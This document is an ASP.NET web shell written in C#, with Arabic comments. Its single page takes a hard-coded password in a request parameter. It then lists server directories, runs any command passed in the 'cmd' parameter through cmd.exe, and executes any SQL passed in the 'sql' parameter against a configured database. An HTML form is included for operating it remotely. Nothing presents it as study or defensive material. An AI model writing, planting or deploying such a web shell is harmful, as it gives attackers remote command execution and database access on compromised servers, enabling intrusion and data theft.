<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Data.SqlClient" %>

<script runat="server">
    private string password = "your_password"; // كلمة المرور للوصول
    private string currentDir = "C:\\"; // مسار المجلد الحالي

    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["key"] == password)
        {
            // عرض الملفات والمجلدات
            if (Request["action"] == "list")
            {
                DisplayDirectory(currentDir);
            }

            // تنفيذ أوامر النظام
            if (Request["cmd"] != null)
            {
                ExecuteCommand(Request["cmd"]);
            }

            // تنفيذ استعلام SQL على قاعدة بيانات
            if (Request["sql"] != null)
            {
                ExecuteSQL(Request["sql"]);
            }
        }
        else
        {
            Response.Write("Unauthorized access.");
        }
    }

    // وظيفة لعرض الملفات والمجلدات
    private void DisplayDirectory(string path)
    {
        DirectoryInfo dir = new DirectoryInfo(path);
        FileInfo[] files = dir.GetFiles();
        DirectoryInfo[] dirs = dir.GetDirectories();

        Response.Write("<h2>Directory: " + path + "</h2>");
        Response.Write("<ul>");
        foreach (DirectoryInfo d in dirs)
        {
            Response.Write("<li><a href='?key=" + password + "&action=list&path=" + d.FullName + "'>" + d.Name + "</a></li>");
        }
        foreach (FileInfo f in files)
        {
            Response.Write("<li>" + f.Name + " (" + f.Length + " bytes)</li>");
        }
        Response.Write("</ul>");
    }

    // وظيفة لتنفيذ أوامر النظام
    private void ExecuteCommand(string command)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + command;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process process = Process.Start(psi);
        string output = process.StandardOutput.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }

    // وظيفة لتنفيذ أوامر SQL
    private void ExecuteSQL(string query)
    {
        string connectionString = "Data Source=YOUR_SERVER;Initial Catalog=YOUR_DATABASE;User ID=YOUR_USER;Password=YOUR_DB_PASSWORD";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            try
            {
                connection.Open();
                SqlCommand command = new SqlCommand(query, connection);
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        Response.Write(reader[i].ToString() + " ");
                    }
                    Response.Write("<br>");
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + ex.Message);
            }
        }
    }
</script>

<html>
<body>
    <form method="get">
        <input type="hidden" name="key" value="your_password" />
        <h2>Execute Command:</h2>
        Command: <input type="text" name="cmd" />
        <input type="submit" value="Execute" />

        <h2>SQL Query:</h2>
        Query: <input type="text" name="sql" />
        <input type="submit" value="Execute SQL" />
    </form>

    <h2>Browse Files:</h2>
    <form method="get">
        <input type="hidden" name="key" value="your_password" />
        <input type="hidden" name="action" value="list" />
        Path: <input type="text" name="path" value="C:\\" />
        <input type="submit" value="Browse" />
    </form>
</body>
</html>
